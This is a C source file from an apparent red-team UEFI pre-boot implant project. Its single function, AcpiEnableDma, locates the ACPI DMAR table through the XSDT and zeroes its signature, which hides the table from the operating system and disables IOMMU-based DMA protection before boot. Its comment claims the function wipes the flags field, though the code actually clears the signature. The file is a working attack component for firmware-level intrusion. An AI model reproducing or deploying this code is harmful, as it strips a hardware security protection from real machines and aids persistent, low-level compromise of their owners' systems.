/*!
 *
 * PREBOOT
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	UINT64	Signature;
	UINT8	Checksum;
	UINT8	OemId[6];
	UINT8	Revision;
	UINT32	RsdtAddress;
	UINT32	Length;
	UINT64	XsdtAddress;
	UINT8	ExtendedChecksum;
	UINT8	Reserved[3];
} EFI_ACPI_2_0_ROOT_SYSTEM_DESCRIPTION_POINTER;

typedef struct
{
	UINT32	Signature;
	UINT32	Length;
	UINT8	Revision;
	UINT8	Checksum;
	CHAR8	OemId[6];
	CHAR8	OemTableId[8];
	UINT32	OemRevision;
	UINT32	CreatorId;
	UINT32	CreatorRevision;
} EFI_ACPI_SDT_HEADER ;

typedef struct __attribute__(( packed ))
{
	EFI_ACPI_SDT_HEADER	Header;
	UINT64			Entry[0];
} XSDT ;

typedef struct __attribute__(( packed ))
{
	EFI_ACPI_SDT_HEADER	Header;
	UINT8			Flags;
} DMAR ;

#define EFI_ACPI_1_TABLE_GUID { 0xeb9d2d30, 0x2d88, 0x11d3, {0x9a, 0x16, 0x0, 0x90, 0x27, 0x3f, 0xc1, 0x4d } }
#define EFI_ACPI_2_TABLE_GUID { 0x8868e871, 0xe4f1, 0x11d3, {0xbc, 0x22, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81 } } 

/*!
 *
 * Purpose:
 *
 * Looks for the ACPI DMAR table and wipes the
 * flags field.
 *
!*/
D_SEC( B ) EFI_STATUS AcpiEnableDma( EFI_SYSTEM_TABLE* SystemTable )
{
	UINTN						Cnt = 0;
	EFI_STATUS					Est = EFI_NOT_FOUND;

	EFI_GUID					Ac1 = EFI_ACPI_1_TABLE_GUID;
	EFI_GUID					Ac2 = EFI_ACPI_2_TABLE_GUID;

	DMAR*						Dmr = NULL;
	XSDT*						Xsd = NULL;
	EFI_ACPI_SDT_HEADER*				Ent = NULL;
	EFI_CONFIGURATION_TABLE*		   	Ect = NULL;
	EFI_ACPI_2_0_ROOT_SYSTEM_DESCRIPTION_POINTER* 	Sdp = NULL;

	/* Loop through and find the RSDP */
	for ( UINTN Idx = 0 ; Idx < SystemTable->NumberOfTableEntries ; ++Idx ) {
		/* Is this an ACPI ( 1/2 ) table GUID? */
		if ( ! __builtin_memcmp( &SystemTable->ConfigurationTable[ Idx ].VendorGuid, &Ac1, sizeof( EFI_GUID ) ) ||
		     ! __builtin_memcmp( &SystemTable->ConfigurationTable[ Idx ].VendorGuid, &Ac2, sizeof( EFI_GUID ) ) ) 
		{
			/* Get pointer to potential RSD */
			Sdp = C_PTR( SystemTable->ConfigurationTable[ Idx ].VendorTable );

			/* Is this RSD PTR */
			if ( Sdp->Signature == 0x2052545020445352 ) {
				if ( Sdp->Revision >= 2 ) {
					Xsd = C_PTR( Sdp->XsdtAddress );

					/* Is this XSDT? */
					if ( Xsd->Header.Signature == 0x54445358 ) {
						/* Get table count */
						Cnt = ( Xsd->Header.Length - sizeof( EFI_ACPI_SDT_HEADER ) ) / sizeof( UINT64 );

						/* Loop through each table */
						for ( INT Jdx = 0 ; Jdx < Cnt ; ++Jdx ) {

							Ent = C_PTR( Xsd->Entry[ Jdx ] );

							/* Is this DMAR? */
							if ( Ent->Signature == 0x52414d44 ) {
								/* Zero out the table */
								__builtin_memset( &Ent->Signature, 0, sizeof( Ent->Signature ) );

								/* Notify success!?! */
								Est = EFI_SUCCESS;
							};
						};
					};
				};
			};
		};
	};
	return Est;
}
